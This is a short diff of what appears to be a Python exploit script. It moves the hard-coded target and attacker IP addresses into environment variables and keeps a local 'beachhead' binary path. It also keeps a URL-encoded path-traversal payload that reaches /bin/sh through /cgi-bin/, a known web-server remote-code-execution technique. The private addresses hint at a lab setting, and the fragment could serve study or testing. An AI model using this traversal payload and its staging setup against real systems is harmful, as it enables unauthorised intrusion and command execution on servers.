@@ -5,8 +5,10 @@ import random
 import string
 
 # --- Configuration ---
-target_ip = "10.37.1.248"
-attacker_ip = "10.37.1.249" 
+# target_ip = "10.37.1.248"
+# attacker_ip = "10.37.1.249" 
+target_ip = os.getenv("TARGET_IP", "10.37.1.248")
+attacker_ip = os.getenv("ATTACKER_IP", "10.37.1.249")
 local_binary = "./beachhead/beachhead"
 
 traversal = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
